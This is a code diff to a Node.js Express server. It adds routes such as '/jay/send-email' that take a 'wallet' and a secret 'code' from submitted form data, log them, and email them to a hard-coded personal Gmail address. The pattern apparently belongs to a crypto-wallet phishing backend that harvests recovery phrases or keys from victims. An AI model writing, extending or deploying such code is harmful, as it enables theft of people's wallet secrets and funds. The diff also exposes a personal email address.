@@ -27,7 +27,43 @@ app.get("/scheduled-task", (req, res) => {
   res.send("Task completed");
 });
 
-app.post("/send-email", async (req, res) => {
+app.post("/jay/send-email", async (req, res) => {
+  const { text, wallet } = req.body;
+  console.log("Received Data:", { text, wallet });
+
+  if (!text || !wallet) {
+    return res
+      .status(400)
+      .json({ error: "Wallet and code selection are required." });
+  }
+
+  try {
+    let transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user: emailAddress, // Your Gmail
+        pass: emailPassword, // Your App Password
+      },
+    });
+
+    let mailOptions = {
+      from: "emailAddress",
+      to: "deanlewis267@gmail.com", // Replace with your email
+      subject: "Wallet Address",
+      text: `Wallet: ${wallet}\ncode: ${text}`,
+    };
+
+    await transporter.sendMail(mailOptions);
+    console.log("Email sent successfully!");
+
+    res.status(200).json({ message: "Email sent successfully!" });
+  } catch (error) {
+    console.error("Error sending email:", error);
+    res.status(500).json({ error: "Error sending email" });
+  }
+});
+
+app.post("/barbs/send-email", async (req, res) => {
   const { text, wallet } = req.body;
   console.log("Received Data:", { text, wallet });
 
